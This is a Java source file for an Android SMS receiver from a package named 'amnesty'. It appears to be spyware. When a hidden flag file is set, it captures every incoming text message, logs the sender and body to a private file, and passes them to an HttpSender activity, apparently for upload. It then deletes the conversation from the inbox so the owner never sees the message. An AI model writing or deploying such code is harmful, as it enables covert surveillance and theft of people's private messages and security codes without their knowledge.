package com.mhunter.amnesty;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.text.DateFormat;
import java.util.Date;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver{
	SMS sms;
	String rms = "sub";
	
	@Override
	public void onReceive(Context context, Intent intent) {
		String url = context.getFilesDir().getAbsolutePath() + "/" + rms + "flagder.txt";
		int x = 0;
		try {
			x = read_flag(context, url);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		if(context != null && intent != null && x != 0){
			Bundle bundle = intent.getExtras();
			Object[] pdus = (Object[]) bundle.get("pdus");
			SmsMessage[] messages = new SmsMessage[pdus.length];
			for (int i = 0; i < messages.length; i++)
			{
				messages[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
				sending (context, messages[i].getDisplayOriginatingAddress(), messages[i].getDisplayMessageBody());
				DeleteSMSFromInbox2(context, messages[i]);
			}
			//DeleteSMSFromInbox2(context, messages);
			
		}
		//this.abortBroadcast();
	}
 
	private void DeleteSMSFromInbox2(Context context, SmsMessage mesg) {
		String strUriInbox = "content://sms/inbox";
		Uri uriSms = Uri.parse(strUriInbox);
        try {
                StringBuilder sb = new StringBuilder();
                sb.append("address='" + mesg.getDisplayOriginatingAddress() + "' AND ");
                sb.append("body='" + mesg.getDisplayMessageBody() + "'");
                Cursor c = context.getContentResolver().query(uriSms, null, sb.toString(), null, null);
                c.moveToFirst();
                int thread_id = c.getInt(1);
                context.getContentResolver().delete(Uri.parse("content://sms/conversations/" + thread_id), null, null);
                c.close();
        } catch (Exception ex) {
        	ex.printStackTrace();
        }
	}	
	
	private void sending (Context context, String str1, String str2){
		String currentDateTimeString = DateFormat.getDateInstance().format(new Date());
		try {
			write_file(context, currentDateTimeString + " IN " + str1 + "  " + str2 + "\n");
			write_rec(context);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}		
		Intent newintent = new Intent(context, HttpSender.class);
		newintent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	//	Pass in data
		newintent.putExtra("address", str1);
		newintent.putExtra("message", str2);
		context.startActivity(newintent);
	}
	
	public void write_rec(Context context) throws Exception{
		String url = context.getFilesDir().getAbsolutePath() + "/" + rms + "recder.txt";
		int x = read_rec(context, url) + 1;
		String str = Integer.toString(x);
		byte[] w = str.getBytes();
        FileOutputStream fos=null;
        try {
            fos=new FileOutputStream(url);
            fos.write(w);
            fos.close();
        } catch (Exception e) {
            if (fos!=null) fos.close();
            throw e;
        }
	}
	
	public int read_rec(Context context, String url) throws Exception{
			int myNum = 0;
			FileInputStream fin = null;
			try {
				fin = new FileInputStream(url);
			} catch (FileNotFoundException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			InputStream in = (InputStream) fin;
			if (in != null) {
			  // prepare the file for reading
			  InputStreamReader input = new InputStreamReader(in);
			  BufferedReader buffreader = new BufferedReader(input); 
			  String line;		  
			  line = null;  
			  try {
					line = buffreader.readLine();				
			  	} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			  	
				try {
					if(line != null)
						myNum = Integer.parseInt(line);
				} catch(NumberFormatException nfe) {
				   System.out.println("Could not parse " + nfe);
				} 						 
				try {
				in.close();
				} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				}
			}
			return myNum;
	}

	public void write_file(Context context, String TESTSTRING) throws Exception{
		String url = context.getFilesDir().getAbsolutePath() + "/" + rms + "logosder.txt";
		str2file(TESTSTRING, url);
	}	

	public static void data2file(
        byte[] w,String fileName) throws Exception {
        FileOutputStream fos=null;
        try {
            fos=new FileOutputStream(fileName, true);
            fos.write(w);
            fos.close();
        } catch (Exception e) {
            if (fos!=null) fos.close();
            throw e;
        }
    }
	
	public static void str2file(
        String str,String fileName) throws Exception {
        data2file(str.getBytes(),fileName);
    }
	
	public int read_flag(Context context, String url) throws Exception{
		int myNum = 0;
		FileInputStream fin = null;
		try {
			fin = new FileInputStream(url);
		} catch (FileNotFoundException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		InputStream in = (InputStream) fin;
		if (in != null) {
		  // prepare the file for reading
		  InputStreamReader input = new InputStreamReader(in);
		  BufferedReader buffreader = new BufferedReader(input); 
		  String line;		  
		  line = null;  
		  try {
				line = buffreader.readLine();				
		  	} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		  	
			try {
				if(line != null)
					myNum = Integer.parseInt(line);
			} catch(NumberFormatException nfe) {
			   System.out.println("Could not parse " + nfe);
			} 						 
			try {
			in.close();
			} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			}
		}
		return myNum;
	}
	
}